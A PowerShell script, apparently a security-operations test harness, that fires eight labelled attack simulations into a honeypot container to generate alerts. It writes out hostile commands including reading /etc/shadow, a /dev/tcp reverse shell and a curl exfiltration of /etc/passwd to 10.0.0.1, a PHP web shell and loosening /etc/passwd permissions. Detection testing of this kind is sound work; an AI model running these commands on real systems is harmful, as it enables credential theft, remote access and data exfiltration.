param(
    [string]$Target = "honeypot-web",
    [switch]$Full
)

Write-Host "============================================" -ForegroundColor Cyan
Write-Host "  AI-SOC Attack Simulation Suite" -ForegroundColor Cyan
Write-Host "  Testing: $Target" -ForegroundColor Cyan
Write-Host "============================================" -ForegroundColor Cyan

$attacks = @(
    @{Name="Credential Dump (T1003.001)"; Cmd="docker exec $Target cat /etc/shadow 2>&1"},
    @{Name="Reverse Shell (T1059.004)"; Cmd="docker exec $Target bash -c 'exec 5<>/dev/tcp/10.0.0.1/4444;cat <&5' 2>&1"},
    @{Name="Crypto Miner (T1496)"; Cmd="docker exec $Target sh -c 'nohup sh -c \"while true; do stress --cpu 2 --timeout 30s; done\" --name xmrig &' 2>&1"},
    @{Name="Escalate Privileges (T1548)"; Cmd="docker exec $Target chmod 777 /etc/passwd 2>&1"},
    @{Name="Container Escape (T1611)"; Cmd="docker exec $Target mount -o bind /proc /proc 2>&1"},
    @{Name="Web Shell (T1505.003)"; Cmd="docker exec $Target sh -c 'echo \"<?php system(\$_GET[\\\"cmd\\\"]); ?>\" > /tmp/shell.php' 2>&1"},
    @{Name="Network Scan (T1046)"; Cmd="docker exec $Target sh -c 'for i in 1 2 3; do echo >/dev/tcp/localhost/\$i 2>&1; done' 2>&1"},
    @{Name="Data Exfil (T1048)"; Cmd="docker exec $Target bash -c 'curl -X POST -d @/etc/passwd http://10.0.0.1/exfil 2>&1'"}
)

foreach ($attack in $attacks) {
    Write-Host "`n[+] Launching: $($attack.Name)" -ForegroundColor Yellow
    try {
        $result = Invoke-Expression $attack.Cmd 2>&1
        if ($LASTEXITCODE -eq 0 -or $LASTEXITCODE -eq 1 -or $LASTEXITCODE -eq 126) {
            Write-Host "    Sent successfully" -ForegroundColor Green
        }
    } catch {
        Write-Host "    Error: $_" -ForegroundColor DarkGray
    }
    Start-Sleep -Milliseconds 800
}

Write-Host "`n============================================" -ForegroundColor Green
Write-Host "  All $($attacks.Count) attacks sent!" -ForegroundColor Green
Write-Host "  Dashboard: http://localhost:8080" -ForegroundColor Green
Write-Host "  Kibana:    http://localhost:5601" -ForegroundColor Green
Write-Host "============================================" -ForegroundColor Green
